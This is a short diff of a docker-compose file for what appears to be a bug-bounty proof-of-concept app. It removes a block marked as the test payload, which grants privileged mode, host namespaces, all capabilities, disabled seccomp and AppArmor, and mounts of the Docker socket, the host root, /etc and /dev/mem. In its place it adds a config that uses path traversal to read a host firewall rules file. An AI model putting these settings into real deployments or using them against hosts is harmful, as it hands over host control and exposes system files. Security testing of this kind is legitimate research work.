@@ -4,28 +4,9 @@ services:
     image: bb-poc-app
     ports:
       - "8080:8080"
-    environment:
-      - PORT=8080
+    configs:
+      - poc_config
 
-    # --- everything below is the actual test payload ---
-    privileged: true
-    network_mode: host
-    pid: host
-    ipc: host
-    userns_mode: host
-
-    cap_add:
-      - ALL
-
-    security_opt:
-      - seccomp:unconfined
-      - apparmor:unconfined
-
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-      - /:/host_root:ro
-      - /etc:/host_etc:ro
-
-    devices:
-      - /dev/mem
-      - /dev/kmem
+configs:
+  poc_config:
+    file: ../../../../../../etc/ufw/user6.rules
